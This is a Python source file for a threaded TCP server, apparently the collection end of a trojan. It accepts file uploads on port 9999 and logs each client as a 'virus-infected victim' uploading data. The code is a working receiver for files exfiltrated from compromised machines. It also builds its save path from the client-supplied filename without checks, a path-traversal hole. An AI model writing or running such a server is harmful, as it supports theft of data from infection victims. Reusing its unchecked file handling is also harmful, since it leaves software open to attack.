import socketserver
import struct
import json
import os
import time

class ToadServer(socketserver.BaseRequestHandler):
    coding='utf-8'
    max_packet_size=1024

    def handle(self):
        ip,port=self.client_address
        with open(r'access.log',mode='a',encoding='utf-8') as f:
            f.write('[%s] 病毒感染者-> %s:%s 正在上传数据\n' %(time.strftime('%Y-%m-%d-%H:%M:%S'),ip, port))

        try:
            head = self.request.recv(4)
            head_json_len = struct.unpack('i', head)[0]
            head_json = json.loads(self.request.recv(head_json_len).decode('utf-8'))
            data_len = head_json['data_size']
            filename = head_json['filename']

            recv_size = 0
            recv_data = b''
            with open(r'client_msg/client_%s_%s' %(ip,filename), 'ab') as f:
                while recv_size < data_len:
                    recv_data = self.request.recv(1024)
                    f.write(recv_data)
                    recv_size += len(recv_data)

        except Exception as e:
            # 客户端断开
            self.request.close()



myserver=socketserver.ThreadingTCPServer(('0.0.0.0', 9999),ToadServer)
myserver.serve_forever()